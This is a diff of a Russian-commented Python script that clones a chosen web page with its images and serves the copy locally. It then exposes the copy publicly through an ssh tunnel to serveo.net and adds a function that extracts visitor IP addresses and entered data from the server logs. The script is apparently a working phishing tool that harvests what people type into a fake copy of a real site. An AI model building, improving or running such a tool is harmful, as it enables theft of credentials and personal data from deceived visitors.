@@ -2,11 +2,12 @@ import requests
 import subprocess
 import time
 import os
+import re  # Импортируем модуль для работы с регулярными выражениями
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, urljoin
 
 # Введите URL
-url = input('\nВыбери URL ➤ ')
+url = input('\nВведите URL ➤ ')
 
 # Проверяем, что URL не пустой
 if url.strip():
@@ -18,37 +19,61 @@ if url.strip():
     soup = BeautifulSoup(html_content, 'html.parser')
     base_url = response.url
 
-    # Функция для проверки, является ли строка IP-адресом
-    def is_ip_address(s):
-        parts = s.split('.')
-        if len(parts) != 4:
-            return False
-        for part in parts:
-            if not part.isdigit() or not 0 <= int(part) <= 255:
-                return False
-        return True
-
-    # Функция для фильтрации и вывода данных
-    def filter_and_print(tag, attribute):
-        if 'input' in tag:
-            print(tag)
-        elif attribute == 'src' and tag in ['img', 'script']:
-            make_absolute_links(tag, attribute)
-            print(tag)
-
-    # Преобразуем относительные ссылки
     def make_absolute_links(tag, attribute):
         if not tag[attribute].startswith(('http://', 'https://', '//')):
             tag[attribute] = urljoin(base_url, tag[attribute])
 
-    # Выводим теги с атрибутами src и input
-    for tag in soup.find_all():
-        if tag.name == 'img' and 'src' in tag.attrs:
-            filter_and_print(tag.name, 'src')
-        elif tag.name == 'script' and 'src' in tag.attrs:
-            filter_and_print(tag.name, 'src')
-        elif tag.name == 'input':
-            filter_and_print(tag.name, None)
+    # Преобразуем относительные ссылки
+    for tag in soup.find_all(['a', 'link'], href=True):
+        make_absolute_links(tag, 'href')
+
+    for tag in soup.find_all(['img', 'script'], src=True):
+        make_absolute_links(tag, 'src')
+
+    for tag in soup.find_all('img', {'data-src': True}):
+        make_absolute_links(tag, 'data-src')
+
+    # Ждем некоторое время перед сохранением HTML-кода
+    time.sleep(5)
+
+    # Добавляем JavaScript-скрипт для обработки асинхронной загрузки изображений
+    script = """
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            var lazyImages = document.querySelectorAll('img[data-src]');
+            lazyImages.forEach(function(img) {
+                img.setAttribute('src', img.getAttribute('data-src'));
+            });
+        });
+    </script>
+    """
+
+    # Вставляем скрипт в конец HTML-страницы
+    soup.body.append(BeautifulSoup(script, 'html.parser'))
+
+    # Проверяем наличие изображений на странице и сохраняем их
+    image_folder = 'images'
+    os.makedirs(image_folder, exist_ok=True)
+
+    image_paths = []
+    image_tags = soup.find_all('img')
+    for img_tag in image_tags:
+        if 'src' in img_tag.attrs:  # Проверяем наличие атрибута 'src'
+            make_absolute_links(img_tag, 'src')
+            image_url = img_tag['src']
+            image_name = os.path.basename(urlparse(image_url).path)
+            image_path = os.path.join(image_folder, image_name)
+
+            try:
+                image_content = requests.get(image_url).content
+                with open(image_path, 'wb') as image_file:
+                    image_file.write(image_content)
+                print(f"Изображение сохранено: {image_path}")
+                image_paths.append(image_path)
+            except Exception as e:
+                print(f"Ошибка при сохранении изображения {image_url}: {str(e)}")
+        else:
+            print("Тег изображения не содержит атрибута 'src'.")
 
     # Сохраняем HTML-код в файл
     file_path = 'downloaded_page.html'
@@ -57,42 +82,55 @@ if url.strip():
 
     print(f"Страница успешно скачана и сохранена в файл {file_path}")
 
-    # Шаг 2: Запуск локального сервера
+# Функция для извлечения IP-адреса и данных, введённых на сайте, из логов
+def parse_logs(log_file):
+    ip_regex = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'  # Регулярное выражение для поиска IP-адреса
+    data_regex = r'"([^"]*)"'  # Регулярное выражение для поиска введённых данных в кавычках
+    results = []  # Список для хранения результатов
 
-    # Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
-    local_server_command = 'python -m http.server 8000'
+    with open(log_file, 'r') as f:
+        for line in f:
+            ip_match = re.search(ip_regex, line)
+            data_match = re.search(data_regex, line)
+            if ip_match and data_match:
+                ip = ip_match.group()
+                data = data_match.group(1)
+                results.append((ip, data))
+    return results
 
-    # Запускаем команду для локального сервера с помощью subprocess
-    local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)
+# Шаг 2: Запуск локального сервера
 
-    # Печатаем сообщение о запуске локального сервера
-    print("Локальный сервер запущен на порту 8000")
+# Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
+local_server_command = 'python -m http.server 8000'
 
-    # Шаг 3: Запуск Serveo.net
+# Запускаем команду для локального сервера с помощью subprocess
+local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)
 
-    # Используем оригинальную команду Serveo.net без изменений
-    tru_201 = '8000'  # Замените на нужный вам порт
-    serveo_command = f"ssh -q -R 80:localhost:{tru_201} serveo.net -T"
-    serveo_process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE)
+# Печатаем сообщение о запуске локального сервера
+print("Локальный сервер запущен на порту 8000")
 
-    # Получаем public URL из вывода процесса Serveo
-    serveo_url = serveo_process.stdout.readline().strip().decode('utf-8').split()[-1]
+# Шаг 3: Запуск Serveo.net
 
-    print(f"Файл доступен по следующему public URL: {serveo_url}")
+# Используем оригинальную команду Serveo.net без изменений
+tru_201 = '8000'  # Замените на нужный вам порт
+serveo_command = f"ssh -q -R 80:localhost:{tru_201} serveo.net -T"
+serveo_process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE)
 
-    # Добавляем задержку, чтобы скрипт не завершался сразу
-    try:
-        while True:
-            time.sleep(1)
-    except KeyboardInterrupt:
-        # Прерываем выполнение при нажатии Ctrl+C
+# Получаем public URL из вывода процесса Serveo
+serveo_url = serveo_process.stdout.readline().strip().decode('utf-8').split()[-1]
 
-        # Завершаем процессы локального сервера и Serveo.net
-        local_server_process.terminate()
-        serveo_process.terminate()
+print(f"Файл доступен по следующему public URL: {serveo_url}")
 
-        # Удаляем все скачанные файлы
-        os.remove(file_path)
-        print("Скрипт завершен. Все скачанные файлы удалены.")
-else:
-    print("Пустой URL. Пожалуйста, введите действительный URL.")
+try:
+    while True:
+        time.sleep(1)
+except KeyboardInterrupt:
+    # Прерываем выполнение при нажатии Ctrl+C
+
+    # Завершаем процессы локального сервера и Serveo.net
+    local_server_process.terminate()
+    serveo_process.terminate()
+
+    # Удаляем все скачанные файлы
+    os.remove(file_path)
+    print("Скрипт завершен. Все скачанные файлы удалены.")
